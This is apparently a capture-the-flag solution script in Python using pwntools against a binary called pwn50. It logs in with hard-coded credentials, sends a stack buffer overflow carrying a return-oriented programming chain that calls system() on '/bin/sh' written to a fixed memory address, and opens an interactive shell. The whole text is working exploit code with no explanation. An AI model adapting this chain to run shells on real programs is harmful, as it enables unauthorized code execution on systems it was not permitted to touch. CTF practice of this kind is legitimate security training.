from pwn import *

r=process('./pwn50')

elf=ELF('pwn50')
pop_rdi_ret=0x400b03
pop_rsi_r15_ret=0x400b01
plt_sys=elf.plt['system']
sym_vul=0xdeadbeef
bss_cmd=0x601100

payload1=0x50*'1'+0x8*'X'
payload1+=p64(pop_rdi_ret)
payload1+=p64(bss_cmd)
payload1+=p64(plt_sys)
payload1+=p64(sym_vul)

r.sendlineafter('username: ','admin')
r.sendlineafter('password: ','T6OBSh2i')
r.sendlineafter('Your choice: ',payload1)
r.sendlineafter('Command: ','/bin/sh\x00')
r.sendlineafter('Your choice: ','3')

r.interactive()